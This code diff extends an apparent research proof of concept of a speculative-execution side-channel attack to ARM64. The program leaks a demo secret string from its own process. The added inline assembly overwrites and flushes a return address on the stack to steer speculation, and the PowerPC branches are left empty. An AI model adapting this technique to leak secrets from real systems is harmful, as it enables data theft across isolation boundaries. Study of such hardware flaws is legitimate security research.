@@ -27,7 +27,7 @@
 
 // TODO(asteinha) Make this work with ICC.
 // TODO(asteinha) Implement support for MSVC and Windows.
-// TODO(asteinha) Investigate the exploitability of ARM64 and PowerPC.
+// TODO(asteinha) Investigate the exploitability of PowerPC.
 
 // Objective: given some control over accesses to the *non-secret* string
 // "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
@@ -37,16 +37,31 @@ const char *public_data = "Hello, world!";
 const char *private_data = "It's a s3kr3t!!!";
 extern char afterspeculation[];
 
-// Take the "afterspeculation" label address, push in on the stack and return
-// to it.
+// Take the "afterspeculation" label address, push in on the stack, flush the
+// stack address and return.
 __attribute__((noinline))
 void escape() {
   asm volatile(
+#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
+    defined(_M_IX86)
       "pushq %0\n"
       "clflush (%%rsp)\n"
       "mfence\n"
       "lfence\n"
       "ret\n"::"r"(afterspeculation));
+#elif defined(__aarch64__)
+      "adr x9, afterspeculation\n"
+      "str x9, [sp, #-16]!\n"
+      "mov x10, sp\n"
+      "dc civac, x10\n"
+      "dsb sy\n"
+      "ldr x30, [sp], #16\n"
+      "ret\n");
+#elif defined(__powerpc__)
+
+#else
+#  error Unsupported CPU.
+#endif
 }
 
 // Call the "escape" function which smashes the stack jumping back to the
@@ -80,8 +95,21 @@ static char leak_byte(const char *data, size_t offset) {
     // 0xfedcba9801234567 value.
     asm volatile(
         "BACKUP_REGISTERS\n"
+#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
+    defined(_M_IX86)
         "movq $0xfedcba9801234567, %rax\n"
         "pushq %rax\n");
+#elif defined(__aarch64__)
+        "movz x9, 0x4567\n"
+        "movk x9, 0x0123, lsl 16\n"
+        "movk x9, 0xba98, lsl 32\n"
+        "movk x9, 0xfedc, lsl 48\n"
+        "str x9, [sp, #-16]!\n");
+#elif defined(__powerpc__)
+
+#else
+#  error Unsupported CPU.
+#endif
 
     speculation(data, offset, isolated_oracle);
 
@@ -90,10 +118,25 @@ static char leak_byte(const char *data, size_t offset) {
     asm volatile(
         "_afterspeculation:\n" // For MacOS.
         "afterspeculation:\n" // For Linux.
+#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
+    defined(_M_IX86)
         "movq $0xfedcba9801234567, %rax\n"
         "popq %rbx\n"
         "cmpq %rbx, %rax\n"
         "jnz afterspeculation\n"
+#elif defined(__aarch64__)
+        "movz x11, 0x4567\n"
+        "movk x11, 0x0123, lsl 16\n"
+        "movk x11, 0xba98, lsl 32\n"
+        "movk x11, 0xfedc, lsl 48\n"
+        "ldp x9, x10, [sp], #16\n"
+        "cmp x11, x9\n"
+        "bne afterspeculation\n"
+#elif defined(__powerpc__)
+
+#else
+#  error Unsupported CPU.
+#endif
         "RESTORE_REGISTERS\n");
 
     std::pair<bool, char> result =
